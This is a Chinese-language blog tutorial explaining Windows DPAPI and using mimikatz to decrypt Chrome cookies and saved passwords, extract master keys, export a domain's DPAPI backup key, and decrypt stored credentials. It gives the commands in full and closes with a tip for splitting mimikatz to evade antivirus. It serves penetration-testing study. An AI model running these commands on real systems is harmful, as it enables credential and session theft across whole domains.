> 原文链接: https://www.anquanke.com//post/id/158667 


# Mimikatz之DPAPI学习与实践


                                阅读量   
                                **257522**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01a6d399b3edc87c47.jpg)](https://p4.ssl.qhimg.com/t01a6d399b3edc87c47.jpg)

## 0x00 前言

​ 本文就讲解下Windows下的DPAPI，并且利用mimikatz来解密那些由DPAPI加密的文件。本文使用mimikatz版本2.1.1-20180820，Chrome 版本68.0.3440.106 (Official Build) (64-bit)。



## 0x01 什么是DPAPI

​ DPAPI 英文全称：Data Protection API ，顾名思义就是用来保护数据的接口。这个接口在windows中大量的使用来加密数据，比如chrome的cookies和login data。

​ 更多的详情可以看[这篇文章](http://vztekoverflow.com/2018/07/31/tbal-dpapi-backdoor/)。 在这里我大致的把这篇文章总结下也是更加详细的介绍DPAPI：

​ 1.DPAPI 使用了叫做`Master Key`的东西，用来解密和加密。`Master Key` 并不会存在在磁盘上，是通过用户的密码HASH加密生成。

​ 2.`Master Key` 的第一种实现方式用用户NTLM Hash来加密。由于NTLM Hash在Windows中有着各种重要的作用，而且NTLM Hash是存储在SAM文件中，只要攻击者获取到Hash就可以用来生成`Master Key`来解密数据了。所以为了防止这样的事，就有了第二种：直接用用户密码生成，函数：`SHA‑1(UTF16LE(user_password))` 。

就算攻击者获取到NTLM，如果不能解密出用户的密码不能生成`Master Key`。

​ 3.文章中还提到了`ARSO`和`TBAL` 。ARSO 英文全称：Automatic Restart Sign-On 。TBAL 文中作者猜测AL是Auto Logon，不清楚TB什么意思。但是评论中有个猜测是Trusted Boot Auto Logon。都是在WIndows 8和Windows 10中才添加的新特性，就是保存了用户会话，恢复到重启之前的状态，也就是在重启之前密码都保存在磁盘中，具体可以看看文章的详细说明。

​ 4.视频演示了整个过程，关闭虚拟机，通过挂载磁盘的方式，来读取security与system文件获取TBAL中保存的SHA1 HASH，之后通过这个HASH与用户的GUID就可以解密得到`Master Key`。其中也有这样一句话：`but if it were a real computer, imagine physically connecting the HDD to your machine.` 所以~~

微软[官方文章](https://msdn.microsoft.com/en-us/library/ms995355.aspx%20userpassword+sha-1+random%2016%20bytes+4000%20pbkdf2)更加详细介绍了生成`Master key`与加密`Master Key`，及怎么备份。而上面第四步就是解密，我这里利用一个在线工具演示下生成`Matser key`。

[![](https://p5.ssl.qhimg.com/t018f1da79c3422ef81.png)](https://p5.ssl.qhimg.com/t018f1da79c3422ef81.png)



## 0x02 DPAPI的利用

### <a class="reference-link" name="1.Chrome%20Cookies/Login%20Data"></a>1.Chrome Cookies/Login Data

本地用户登录时，解密Cookies：

`dpapi::chrome /in:"%localappdata%GoogleChromeUser DataDefaultCookies" /unprotect`

[![](https://p0.ssl.qhimg.com/t013b6c14d4b193dcfe.png)](https://p0.ssl.qhimg.com/t013b6c14d4b193dcfe.png)

如果通过某些方式从其它电脑获取到cookie到本地：

先执行上面这条命令看看，会报错：

[![](https://p2.ssl.qhimg.com/t015f39ba8a924da60f.png)](https://p2.ssl.qhimg.com/t015f39ba8a924da60f.png)

提示需要GUID `{`219d25e6-27f5-4754-8bcb-2aa77df53b68`}` 这个用户的`Master key`才能解密，所以在你拿回这个cookie文件时，要把那个机器的masterkey导出一下，两个命令`privilege::debug` `sekurlsa::dpapi`：

[![](https://p2.ssl.qhimg.com/t01d982ef82ed8d2d6a.png)](https://p2.ssl.qhimg.com/t01d982ef82ed8d2d6a.png)

接下来就`dpapi::chrome /in:"c:tempCookies" /masterkey:上图的masterkey值 /unprotect`

[![](https://p1.ssl.qhimg.com/t01de2424f08fc7b540.png)](https://p1.ssl.qhimg.com/t01de2424f08fc7b540.png)

而如果是域用户的话，是由域用户的master key就是由域的DPAPI key来保护的，`lsadump::backupkeys /system:DC CONTROLLER /export`会得到一个PVK文件，可以用来解密所有域用户的Master Key，而且这个key是不会改变的。`dpapi::masterkey /in:"C:UsersxxxxxAppDataRoamingMicrosoftProtectsid值ca748af3–8b95–40ae-8134-cb9534762688" /pvk:导出的PVK文件`这里就可以解密得到域用户的Master Key值。然后跟上面一样`dpapi::chrome /in:Cookies /masterkey:a3fv34aedd7...`，这样就能解密Cookies的内容了。

导出pvk:

[![](https://p5.ssl.qhimg.com/t01f4b3d06042a3b416.png)](https://p5.ssl.qhimg.com/t01f4b3d06042a3b416.png)

利用PVK解密得到masterkey值，后面一样解密就是了：

[![](https://p5.ssl.qhimg.com/t0162bd9a2beda398ca.png)](https://p5.ssl.qhimg.com/t0162bd9a2beda398ca.png)

解密保存的密码跟上面类似，把传入文件改成login data：

[![](https://p0.ssl.qhimg.com/t011dfaf304ecbf97da.png)](https://p0.ssl.qhimg.com/t011dfaf304ecbf97da.png)

### <a class="reference-link" name="2.Rdg%20%E6%96%87%E4%BB%B6"></a>2.Rdg 文件

最新release版本添加了解密rdg的功能，windows中`C:WindowsSystem32configsystemprofileAppDataLocalMicrosoftCredentialsxxx`中保存的信息与WIFI密码的保存都是利用了DPAPI来加密：

[![](https://p3.ssl.qhimg.com/t01dbb79d67fea8fcb1.png)](https://p3.ssl.qhimg.com/t01dbb79d67fea8fcb1.png)

先向DC进行RPC查询出key，利用key，`dpapi::cred /in:C:UsersxxAppDataLocalMicrosoftCredentialsxxxxx /unprotect /masterkey:X`解密Credentials下保存的凭据：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017b6b8f90bc6b6be4.png)



## 0X03 总结

现在mimikatz功能越来越多，并不是所有功能都会在当时的渗透环境中使用，其实大家完全可以把其中每个模块单独分出来用，这样体积可以减少，而且还可以过下静态查杀。windows下还有很多接口是MSDN中没有文档或者很少文档的，很多大佬应该都FUZZ出来一些了。可以看看这位[BLOG](http://www.hexacorn.com/blog/) 经常有windows的一些TRICKS。
